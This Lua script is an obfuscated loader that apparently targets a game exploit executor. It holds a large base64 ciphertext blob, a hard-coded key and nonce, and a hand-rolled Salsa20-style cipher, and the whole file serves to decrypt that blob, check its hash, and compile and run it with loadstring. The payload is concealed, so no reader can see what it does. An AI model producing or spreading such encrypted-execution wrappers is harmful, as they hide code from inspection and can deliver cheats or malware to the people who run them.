local _ygn = pcall
local _zvc = nil
local _jqy = ""

local function _safeRun()
  local _b0 = "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"
  local _b1 = "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"
  local _b2 = "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"
  local _b3 = "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"
  local _b4 = "hlX/CgaLIsIrSBDqfM3UOEZOeG1Ro1FdWBtW4KkBX4BuaS2e7jg96nx5Z8aMFC5jFTUrCI+MdXK/sdslZsDXc6aep0WiIMVNQ6PRf3kYh6KXMFpS0GDMuTR4oh8nwXlt5pM4PVJP3+4Xs/J+/ugNuCQXumPUjzMwmtOsClnvtTuSEx2FiNSygnppxhxbv8F+A0Py0JdSoPzLlFUNsJ+1HYHuqG+cGGuxD0zsWLp0caPVy1SqP5N2mSof9CINPMYDj+S9JtA06OnZdMFe2jNlntFEErnqs2ddiAZwpYkFGJ5DLkKmgbenNAMVy206eYmxlPMReVYS4DgVGTZInUgLM6LZkJ1xx14hn8cvG3doLwWJfN+73ZOjXQZtSwsa8dRpEkEsGJx2ZmE5Myf1+6/JFAfCjob3BXMpmPDHK6tlj4FwNqH30SG8MrFNs3xvTB6UmMHnwn5R91hOFT7j2V4aV7vrshfu26psakgGB8Xzb2YadRvDsZJid0AEXnmVvDpsL/uSaAqbQeJPUqAYxKFfntBFmHYBaARc4JmQusEWs2vjZmTliDwIHykjJJJINOU8RkKyOGKr3DEcU4K4WwORG2+JbdI5E/R3zEMWDBc1v8WBDzuXI50Ig0Fxa8dHrv5/4N4XaGEb+X0IWY+9iK5zD2c9SnRc0d/o0UhZQRJ4Jb7mB4R3iMstSJw958aSulUy6kquJVWVO/nJAhPwlMyQaDsjCxdXLF8x5XrZfEM4wr5gsWsy71Gi/C4S5ZrsDJYcGJg2Ryq3s0c9l5GFaNQJPi0fgGCwehcfsXTNsW3ynkB9SUk/H0x08A7J4nMZ3lnWbqCFy4bOtBSaze988k0l/G9tjA00UPLVE5Q33+Y3lFjZ1eom709pb8sndyVFjhpSuEFiZwDKO5DLd3+ZSaTVvGjNwfrJ/sAlk46/jv+aJnp49ub9MRoPfeieH392c8piiLeyn6y2R7J7hCwITsP+bYyP22PSy5xVlHKSCUcoGdgkkra25VJffw5eYRsld6We+QyFi2gmQdHieyCvET8jN9s4446Ar098W/UoNPm2wlOEqjdZ8FGZ0cz2Yl3g3BkZXxwHzAIJCZ2jBDTvHsjnuSyGV48YwX8e0xQdMKsS3yDUmXpCJlVkIup4bcyeN3IOv7SlDPj7m1wt5aE5hMKj5BWN1O1z5g813jUGowH/k1ld6Gl/KOH3XqWkQudxaXkWMtJ0ku2o0I1GxmBjDYa6HGp0gWmwcHC7z+nOoy20AWDyzrC0xMlgkqoXY+h2oJYq6/e4X/ajMK9H7imV4cSrWBfozCr+Jr7idiPdLCd0jcGCyPIiigUn4KLGrLbko9yJs4wPE2/TNBJC+70nuvVZcpg+eSNNJLQ+Z5PnW08CwupQE4b0vZo+soQI0Z4MACI86MWm2wQCLcyp/07E0SBWWMlxCIjUDrviD+GQxSD+WGzya7wVPQhJlYgwpIfNvV4RWgXRo8+vrHC2572Mb9tsUCFU8EjOoft3FPyC7ZGaz2DzleVIF+JgZP6RWdxIEnwOrAAL9LToaaWvi8cEJByykHqejBeXXJrf4wdYj9LXYzTOyQ=="

  local _bitLib = bit32 or bit
  local _bXor, _bRotl

  if _bitLib and _bitLib.bxor and _bitLib.lrotate then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n) return _bitLib.lrotate(math.floor(tonumber(x) or 0) % 4294967296, math.floor(tonumber(n) or 0) % 32) end
  elseif _bitLib and _bitLib.bxor and _bitLib.lshift and _bitLib.rshift then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      return (_bitLib.lshift(x, n) + _bitLib.rshift(x, 32 - n)) % 4294967296
    end
  else
    _bXor = function(a, b)
      a = math.floor(tonumber(a) or 0) % 4294967296
      b = math.floor(tonumber(b) or 0) % 4294967296
      local r, m = 0, 1
      while a > 0 or b > 0 do
        if (a % 2) ~= (b % 2) then r = r + m end
        a = math.floor(a / 2); b = math.floor(b / 2); m = m * 2
      end
      return r
    end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      if n == 0 then return x end
      local p1 = math.floor(x / 2^(32 - n))
      local p2 = (x * 2^n) % 4294967296
      return (p1 + p2) % 4294967296
    end
  end

  local function _chr(v)
    return string.char(math.floor(tonumber(v) or 0) % 256)
  end

  local function _hex2bin(h)
    local o = {}
    for i = 1, #h, 2 do
      local v = tonumber(h:sub(i, i + 1), 16)
      if v then o[#o + 1] = _chr(v) end
    end
    return table.concat(o)
  end

  local function _b64d(s)
    local tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o = {}
    for i = 1, #s, 4 do
      local a = (tbl:find(s:sub(i, i), 1, true) or 1) - 1
      local b = (tbl:find(s:sub(i + 1, i + 1), 1, true) or 1) - 1
      local c3 = s:sub(i + 2, i + 2)
      local c4 = s:sub(i + 3, i + 3)
      local c = c3 == "=" and 0 or (tbl:find(c3, 1, true) or 1) - 1
      local d = c4 == "=" and 0 or (tbl:find(c4, 1, true) or 1) - 1
      o[#o + 1] = _chr(a * 4 + math.floor(b / 16))
      if c3 ~= "=" then o[#o + 1] = _chr((b % 16) * 16 + math.floor(c / 4)) end
      if c4 ~= "=" then o[#o + 1] = _chr((c % 4) * 64 + d) end
    end
    return table.concat(o)
  end

  local _kbu = _hex2bin("35bc6f559d57f2d75d05d7729b94ec4d8f1dab21fe1051c6c2b19b661fa78e5d")
  local _gsh = _hex2bin("720805543a4a09c0")

  if #_kbu ~= 32 or #_gsh ~= 8 then
    _zvc = "invalid key/nonce"
    return
  end

  local SIG = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574}

  local function _block(k32, n32, ctr_lo, ctr_hi)
    local s = {
      SIG[1], k32[1], k32[2], k32[3], k32[4], SIG[2], n32[1], n32[2],
      ctr_lo, ctr_hi, SIG[3], k32[5], k32[6], k32[7], k32[8], SIG[4]
    }
    local o = {}
    for i = 1, 16 do o[i] = s[i] end

    local function qr(a, b, c2, d)
      s[b] = _bXor(s[b], _bRotl((s[a] + s[d]) % 4294967296, 7))
      s[c2] = _bXor(s[c2], _bRotl((s[b] + s[a]) % 4294967296, 9))
      s[d] = _bXor(s[d], _bRotl((s[c2] + s[b]) % 4294967296, 13))
      s[a] = _bXor(s[a], _bRotl((s[d] + s[c2]) % 4294967296, 18))
    end

    for _ = 1, 10 do
      qr(1, 5, 9, 13); qr(6, 10, 14, 2); qr(11, 15, 3, 7); qr(16, 4, 8, 12)
      qr(1, 2, 3, 4); qr(6, 7, 8, 5); qr(11, 12, 9, 10); qr(16, 13, 14, 15)
    end

    local out = {}
    for i = 1, 16 do
      local v = (s[i] + o[i]) % 4294967296
      v = math.floor(tonumber(v) or 0)
      out[#out + 1] = _chr(v % 256)
      out[#out + 1] = _chr(math.floor(v / 256) % 256)
      out[#out + 1] = _chr(math.floor(v / 65536) % 256)
      out[#out + 1] = _chr(math.floor(v / 16777216) % 256)
    end
    return table.concat(out)
  end

  local k32, n32 = {}, {}
  for i = 1, 8 do
    local p = (i - 1) * 4 + 1
    k32[i] = string.byte(_kbu, p)
           + string.byte(_kbu, p + 1) * 256
           + string.byte(_kbu, p + 2) * 65536
           + string.byte(_kbu, p + 3) * 16777216
  end
  for i = 1, 2 do
    local p = (i - 1) * 4 + 1
    n32[i] = string.byte(_gsh, p)
           + string.byte(_gsh, p + 1) * 256
           + string.byte(_gsh, p + 2) * 65536
           + string.byte(_gsh, p + 3) * 16777216
  end

  local raw = _b64d(table.concat({_b0, _b1, _b2, _b3, _b4}))
  local dec = {}
  local counter = 0
  local acc = {}

  for pos = 1, #raw, 64 do
    local lo = counter % 4294967296
    local hi = math.floor(counter / 4294967296) % 4294967296
    local block = _block(k32, n32, lo, hi)
    counter = counter + 1
    for i = 1, 64 do
      local idx = pos + i - 1
      if idx > #raw then break end
      acc[#acc + 1] = _chr(_bXor(string.byte(raw, idx), string.byte(block, i)))
    end
    if #acc >= 4096 then
      dec[#dec + 1] = table.concat(acc)
      acc = {}
    end
  end
  if #acc > 0 then dec[#dec + 1] = table.concat(acc) end

  _jqy = table.concat(dec)

  local h = 0
  for i = 1, #_jqy do
    h = (h * 16777619 + string.byte(_jqy, i)) % 4294967296
  end
  if h ~= 3821676928 then
    _zvc = "hash mismatch"
    return
  end

  local _load = loadstring or load
  if not _load and getfenv then
    local ok, f = pcall(getfenv)
    if ok and type(f) == "table" then _load = f.loadstring or f.load end
  end
  if not _load then
    _zvc = "no loadstring available in this executor"
    return
  end

  local _okTest, _compiledTest = _ygn(_load, "return 2+2")
  if not _okTest or not _compiledTest then
    _zvc = "loadstring check failed"
    return
  end
  local _okRun, _res = _ygn(_compiledTest)
  if not _okRun or _res ~= 4 then
    _zvc = "loadstring execution check failed"
    return
  end

  local _okComp, _fn = _ygn(_load, _jqy)
  if not _okComp or not _fn then
    _zvc = "compilation failed"
    return
  end

  local _okExec, _execErr = _ygn(_fn)
  if not _okExec then
    _zvc = "execution failed: " .. tostring(_execErr)
  end
end

local _okGlobal, _globalErr = _ygn(_safeRun)
if not _okGlobal then
  warn("[obf] wrapper crashed: " .. tostring(_globalErr))
elseif _zvc then
  warn("[obf] " .. tostring(_zvc))
end
